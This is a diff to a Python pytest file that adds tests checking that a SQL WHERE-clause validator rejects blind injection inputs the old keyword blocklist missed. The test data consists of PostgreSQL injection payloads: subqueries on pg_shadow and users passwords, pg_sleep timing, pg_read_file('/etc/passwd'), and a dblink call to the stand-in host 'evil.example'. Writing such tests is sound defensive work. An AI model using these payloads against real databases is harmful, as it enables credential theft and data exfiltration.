@@ -14,7 +14,6 @@ from pathlib import Path
 
 import pytest
 
-
 PROJECT_ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(PROJECT_ROOT))
 
@@ -133,6 +132,39 @@ def test_validate_where_clause_accepts_simple_clause() -> None:
 def test_validate_where_clause_rejects_unsafe_clause(where: str) -> None:
     """
     Unsafe WHERE clauses must be rejected.
+    """
+    with pytest.raises(ValueError):
+        _validate_where_clause(where)
+
+
+@pytest.mark.parametrize(
+    "where",
+    [
+        # Boolean/subquery-based blind data exfiltration - none of these use
+        # any of the statement keywords (DROP/DELETE/...) or ";"/"--"/"/*"
+        # that the original blocklist checked for.
+        "(select 1 from pg_shadow where usename=current_user)=1",
+        "1=1 UNION SELECT password FROM users",
+        "id in (select id from information_schema.tables)",
+        "pg_sleep(5) is null",
+        "pg_read_file('/etc/passwd') is null",
+        "current_setting('is_superuser')='on'",
+        "current_database()='postgres'",
+        "version() like '%PostgreSQL%'",
+        "(select 1 from dblink('host=evil.example', 'select 1')x)=1",
+        # No spaces around the keyword - the old " select " style substring
+        # check depended on literal surrounding whitespace and missed this.
+        "(select(1))=1",
+    ],
+)
+def test_validate_where_clause_rejects_blind_injection_without_blocked_statements(
+    where: str,
+) -> None:
+    """
+    A WHERE clause is a boolean filter expression; it never legitimately
+    needs SELECT/subqueries or server-internals functions, so these must
+    be rejected even though they contain none of the statement-level
+    keywords (DROP/DELETE/...) the original blocklist covered.
     """
     with pytest.raises(ValueError):
         _validate_where_clause(where)
